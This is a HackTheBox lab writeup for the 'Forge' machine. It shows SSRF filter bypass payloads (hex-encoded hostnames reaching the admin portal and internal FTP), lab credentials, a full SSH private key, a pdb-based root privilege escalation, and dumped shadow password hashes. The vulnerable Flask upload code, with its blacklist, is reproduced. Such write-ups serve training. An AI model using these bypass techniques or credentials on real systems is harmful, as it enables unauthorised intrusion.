---
title: Forge HackTheBox Writeup
author: "tukmogi"
tags: ["hack-the-box", "medium"]
categories: ["boxes", "writeups"]
date: 2022-02-24T13:03:46-05:00
featuredImage: "/images/forge-htb/featured-image.jpg"
---
# Forge
Forge was a great medium linux box that tested on enumeration, evasion techniques and a bit of code review. 
## Enumeration

```zsh
┌──(kali㉿kali)-[~/htb/forge]
└─$ cat nmap/initial.nmap 
# Nmap 7.91 scan initiated Mon Dec 20 04:27:24 2021 as: nmap -sCV -oA nmap/initial -T4 forge.htb
Nmap scan report for forge.htb (10.10.11.111)
Host is up (0.32s latency).
Not shown: 997 closed ports
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
80/tcp open     http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Gallery
Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Dec 20 04:28:06 2021 -- 1 IP address (1 host up) scanned in 42.29 seconds
```

### Port 80

Visiting the web service on port 80, we find a website with images and an upload feature.

![Untitled](/images/forge-htb/Untitled.png)

Scanning for subdomains reveals that there is one called ‘admin.forge.htb’

```bash
┌──(kali㉿kali)-[~/htb/forge]
└─$ wfuzz --hc 302 -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H 'Host: FUZZ.forge.htb' http://forge.htb
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://forge.htb/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                              
=====================================================================

000000036:   200        1 L      4 W        27 Ch       "admin"
```

Accessing the site directly doesn’t isn’t possible, it filters out only for localhost

 

![Untitled](/images/forge-htb/Untitled%201.png)

Since the upload feature, accepts a url, I decided to try fetch the admin portal through it. This also was not possible, there seems to be a back end filtering that has blacklisted names.

![Untitled](/images/forge-htb/Untitled%202.png)

I had to look of a way to bypass this. After looking through, I found one that worked. I encoded the url in hex and got a successful upload

![Untitled](/images/forge-htb/Untitled%203.png)

```bash
http://%61%64%6D%69%6E%2E%66%6F%72%67%65%2E%68%74%62/
```

![Untitled](/images/forge-htb/Untitled%204.png)

We are able to access the admin portal and able to receive more functionality. We see that there is a juicy endpoint called announcements.

```bash
┌──(kali㉿kali)-[~/htb/forge]
└─$ curl http://forge.htb/uploads/M2dvG84uCCDDYJjBrULa                              
<!DOCTYPE html>
<html>
<head>
    <title>Admin Portal</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br><br>
    <br><br><br><br>
    <center><h1>Welcome Admins!</h1></center>
</body>
</html>
```

Accessing the announcement, we find ftp credentials for a user. We however cannot directly use them since the ftp port is filtered in the nmap scan. However, there are more announcements that show us that the admin portal allows for ftp uploads.

```bash
┌──(kali㉿kali)-[~/htb/forge]
└─$ curl http://forge.htb/uploads/6puGcte6363bT55qBiwF
<!DOCTYPE html>
<html>
<head>
    <title>Announcements</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <link rel="stylesheet" type="text/css" href="/static/css/announcements.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br>
    <ul>
        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
    </ul>
</body>
</html>
```

Trying to access the ftp service, I get another filter

```bash
http://%61%64%6D%69%6E%2E%66%6F%72%67%65%2E%68%74%62/upload/?u=ftp://user:heightofsecurity123!@localhost
```

![Untitled](/images/forge-htb/Untitled%205.png)

Once more, a bypass is needed. Encoding [localhost](http://localhost) as hex, works as well. And this gives us access to the ftp service.

```bash
http://%61%64%6D%69%6E%2E%66%6F%72%67%65%2E%68%74%62/upload?u=ftp://user:heightofsecurity123!@%6C%6F%63%61%6C%68%6F%73%74
```

```bash
┌──(kali㉿kali)-[~/htb/forge]
└─$ curl http://forge.htb/uploads/LBnUne2HDCUFqeu14r15
drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
-rw-r-----    1 0        1000           33 Dec 21 06:19 user.txt
```

I was able to retrieve the ssh private key of the user.

```bash
http://%61%64%6D%69%6E%2E%66%6F%72%67%65%2E%68%74%62/upload?u=ftp://user:heightofsecurity123!@%6C%6F%63%61%6C%68%6F%73%74/.ssh/id_rsa
```

```bash
┌──(kali㉿kali)-[~/htb/forge]
└─$ curl -s http://forge.htb/uploads/1dwCS56wIxwghmZZIdug | tee id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
shlLupso7WoS0AAAAKdXNlckBmb3JnZQE=
-----END OPENSSH PRIVATE KEY-----
```

## Privilege escalation

Gaining access to the machine, we find that the user can run certain commands as sudo.

```bash
-bash-5.0$ sudo -l
Matching Defaults entries for user on forge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```

Reviewing the python runnable, we see that it enable one run system checks as admin. However, incase of an error, a debugger called pdb is used. We can use this to spawn a shell by triggering an error

```python
#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
```

I opened up two session for to the box. For the first session, I triggered the remote management app and to the other I connected to the listener. I triggered an error by supplying an alphabetical character instead of a digit. When pdf was triggered, I spawned a shell

![Untitled](/images/forge-htb/Untitled%206.png)

Retrieving the shadow file

```bash
root:$6$Msvc2unlR99fWBAX$boGTeFujypU5XzdRYTBwRdGEUanryagtjUScvHxCfJ.Jt44iwzJhad4rWhXMahebHXA6CSH3Nlr64tpusii6O/:18780:0:99999:7:::
daemon:*:18659:0:99999:7:::
bin:*:18659:0:99999:7:::
sys:*:18659:0:99999:7:::
sync:*:18659:0:99999:7:::
games:*:18659:0:99999:7:::
man:*:18659:0:99999:7:::
lp:*:18659:0:99999:7:::
mail:*:18659:0:99999:7:::
news:*:18659:0:99999:7:::
uucp:*:18659:0:99999:7:::
proxy:*:18659:0:99999:7:::
www-data:*:18659:0:99999:7:::
backup:*:18659:0:99999:7:::
list:*:18659:0:99999:7:::
irc:*:18659:0:99999:7:::
gnats:*:18659:0:99999:7:::
nobody:*:18659:0:99999:7:::
systemd-network:*:18659:0:99999:7:::
systemd-resolve:*:18659:0:99999:7:::
systemd-timesync:*:18659:0:99999:7:::
messagebus:*:18659:0:99999:7:::
syslog:*:18659:0:99999:7:::
_apt:*:18659:0:99999:7:::
tss:*:18659:0:99999:7:::
uuidd:*:18659:0:99999:7:::
tcpdump:*:18659:0:99999:7:::
landscape:*:18659:0:99999:7:::
pollinate:*:18659:0:99999:7:::
sshd:*:18766:0:99999:7:::
systemd-coredump:!!:18766::::::
user:$6$w34hTxAL.LRIcWx8$skVKz6Po0yniq1iLTWR9pz2uIneLDg.70hS9cktguX1ZF48NO.kleINKZxX.u6g9n6TZVDkQVuxb.0qqpgCtG1:18780:0:99999:7:::
lxd:!:18766::::::
usbmux:*:18767:0:99999:7:::
ftp:*:18767:0:99999:7:::
```

## Post Root

I went on to examine how the blocking was being done, there was a list of bad words which would make the request fail it any part of it had a match.

![Untitled](/images/forge-htb/Untitled%207.png)

Examining the upload feature that gave us a foothold to the box. Command injection seems possible but I couldn’t manage to trigger. After I looked up what was happening, I saw that shlex was used to escape shell syntax by wrapping our payload in quotes. This therefore prevented command injection.

![Untitled](/images/forge-htb/Untitled%208.png)

![Untitled](/images/forge-htb/Untitled%209.png)

```python
from . import app
from flask import render_template, request
import werkzeug
import requests
import random
import string
from functools import wraps
import shlex
import subprocess

chars = string.ascii_letters + string.digits
blacklist = ["forge.htb", "127.0.0.1", "10.10.10.10", "::1", "localhost",
             '0.0.0.0', '[0:0:0:0:0:0:0:0]']

supported_schemas = ["http", "https", "ftp", "ftps"]

navigation = [
    {
        "class": "",
        "href": "/",
        "caption": "Portal home",
    },
    {
        "class": "align-right margin-right",
        "href": "/announcements",
        "caption": "Announcements",
    },
    {
        "class": "align-right",
        "href": "/upload",
        "caption": "Upload image",
    }
]

announce = [
    "An internal ftp server has been setup with credentials as \
user:heightofsecurity123!",
    "The /upload endpoint now supports ftp, ftps, http and https\
 protocols for uploading from url.",
    "The /upload endpoint has been configured for easy scripting\
 of uploads, and for uploading an image, one can simply pass\
 a url with ?u=<url>."
]

def ensure_localhost(route_handler):
    @wraps(route_handler)
    def check_ip(*args):
        if request.remote_addr == '127.0.0.1':
            return route_handler(*args)
        return "Only localhost is allowed!\n"
    return check_ip

@app.route("/")
@ensure_localhost
def index():
    return render_template("index.html", navigation=navigation)

@app.route("/upload", methods=["GET", "POST"])
@ensure_localhost
def upload():
    if request.method == 'POST' and 'local' in request.form.keys():
        return upload_local_file()
    elif request.method == 'POST' and 'remote' in request.form.keys():
        if 'url' not in request.form.keys():
            return render_template("upload.html", navigation=navigation,
                                   message="No url defined!")
        return upload_remote_file(request.form['url'])
    elif request.method == "GET" and 'u' in request.args.keys():
        return upload_from_url()
    return render_template("upload.html", navigation=navigation)

def upload_remote_file(url):
    if url:
        try:
            if not (any([x for x in supported_schemas if url.split('://')[0] == x])):
                return render_template('upload.html', navigation=navigation,
                                       message="Invalid protocol! Supported protocols: http, https, ftp, ftps")
            if any([i for i in blacklist if i in url]):
                return render_template('upload.html', navigation=navigation,
                                       message="URL contains a blacklisted address!")
            req = requests.get(url)
            name = rand(20)
            f = open(app.config['UPLOAD_FOLDER'] + name, 'w')
            f.write(req.text)
            f.close()
            req.close()
            return render_template('upload.html', navigation=navigation,
                                   message="File uploaded successfully to the following url:",
                                   url="http://forge.htb/uploads/" + name)
        except Exception as e:
            return render_template('upload.html', navigation=navigation,
                                   message=f'An error occured! Error : {e}')
    return render_template("upload.html", navigation=navigation,
                           message="URL cannot be empty!")

def rand(num):
    return ''.join([random.choice(chars) for _ in range(num)])

def upload_local_file():
    f = request.files['file']
    if f.filename == '':
        return render_template("upload.html", navigation=navigation,
                               message="No file defined!")
    name = rand(20)
    f.save(app.config['UPLOAD_FOLDER'] + name)
    return render_template('upload.html', navigation=navigation,
                           message="File uploaded successfully to the following url:",
                           url="http://forge.htb/uploads/" + name)

def upload_from_url():
    u = request.args['u']
    if u:
        if u.startswith('http://') or u.startswith('https://'):
            return upload_remote_file(u)
        elif u.startswith('ftp://') or u.startswith('ftps://'):
            u = shlex.quote(u)
            return subprocess.check_output('curl ' + u, shell=True)
        return "Invalid protocol! Supported protocols: http, https, ftp, ftps.\n"
    return 'URL not given!\n'

@app.errorhandler(werkzeug.exceptions.HTTPException)
@ensure_localhost
def handle_error(e):
    return e, e.code

@app.route('/announcements')
@ensure_localhost
def announcements():
    return render_template('announcements.html', announcements=announce, navigation=navigation)
```
